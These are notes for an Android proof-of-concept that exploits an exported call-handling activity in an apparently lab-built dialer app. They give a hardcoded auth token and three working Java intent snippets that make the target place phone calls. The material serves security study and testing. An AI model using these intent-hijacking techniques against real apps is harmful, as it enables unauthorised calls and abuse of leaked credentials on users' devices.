## Notes for the PoC Code – What to Do in Points

### 1. **Overview**
- The PoC app demonstrates the exploitation of the exported `CallHandlerServiceActivity` in the target AndroDialer app.
- It provides three buttons, each implementing a different method to invoke the vulnerable activity with the correct token and a phone number.

### 2. **Constants Used**
- `TARGET_PACKAGE`: `com.eightksec.androdialer` – the package of the vulnerable app.
- `TARGET_ACTIVITY`: `com.eightksec.androdialer.CallHandlerServiceActivity` – the exported activity.
- `TOKEN`: `8kd1aL3R_s3Cur3_k3Y_2023` – one of the hardcoded valid tokens (alternatively `8kd1aL3R-s3Cur3-k3Y-2023`).
- `PHONE_NUMBER`: `1234567890` – a test number (can be changed).

### 3. **Method 1 – Using `phoneNumber` Extra**
- **Code**:
  ```java
  Intent intent = new Intent(Intent.ACTION_VIEW);
  intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
  intent.putExtra("enterprise_auth_token", TOKEN);
  intent.putExtra("phoneNumber", PHONE_NUMBER);
  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  startActivity(intent);
  ```
- **How it works**: The phone number is passed directly as an extra named `phoneNumber`. In the target app's code, this extra is checked first, making it the simplest and most reliable method.
- **When to use**: When you want to ensure the number is delivered without relying on URI parsing.

### 4. **Method 2 – Using a `tel:` URI**
- **Code**:
  ```java
  Intent intent = new Intent(Intent.ACTION_VIEW);
  intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
  intent.setData(Uri.parse("tel:" + PHONE_NUMBER));
  intent.putExtra("enterprise_auth_token", TOKEN); // token still needed as extra
  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  startActivity(intent);
  ```
- **How it works**: The number is embedded in a `tel:` URI. The target app extracts it via `Uri.getSchemeSpecificPart()`. The token must still be passed as an extra because it is not part of the URI.
- **When to use**: To simulate clicking on a phone link or when you want to use the `tel:` scheme.

### 5. **Method 3 – Using a `dialersec` URI with Query Parameter**
- **Code**:
  ```java
  Uri uri = Uri.parse("dialersec://call/number/" + PHONE_NUMBER + "?enterprise_auth_token=" + TOKEN);
  Intent intent = new Intent(Intent.ACTION_VIEW);
  intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITY));
  intent.setData(uri);
  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  startActivity(intent);
  ```
- **How it works**:
  - Scheme: `dialersec`
  - Host: `call`
  - Path: `/number/1234567890`
  - Query: `enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023`
- The target app reads the token from the query parameter and extracts the number from the path segment after `number/`. No extra is needed.
- **When to use**: To exploit the custom `dialersec` intent-filter and demonstrate passing all data through the URI.

### 6. **Important Notes for Testing**
- **Permissions**: The target AndroDialer app must have the `CALL_PHONE` permission granted (can be granted manually in system settings) for the call to actually be placed. Otherwise, the activity will still run but may fail silently or log an error.
- **Log Monitoring**: Use `adb logcat | grep -i "CallHandlerService\|androdialer"` to verify token acceptance and see if any errors occur.
- **Phone Number**: You can change `PHONE_NUMBER` to any valid number; even if the call fails, the activity will attempt it.
- **Error Handling**: If a button doesn’t work, ensure the target app is installed and the package/activity names are correct. Also check if the token is properly passed.

### 7. **Summary**
- The PoC app illustrates three distinct ways to trigger the vulnerable activity, all requiring the correct hardcoded token.
- These methods correspond to different parts of the target app’s input validation logic.
- This flexibility confirms the robustness of the exploit and helps in understanding the vulnerability from multiple angles.
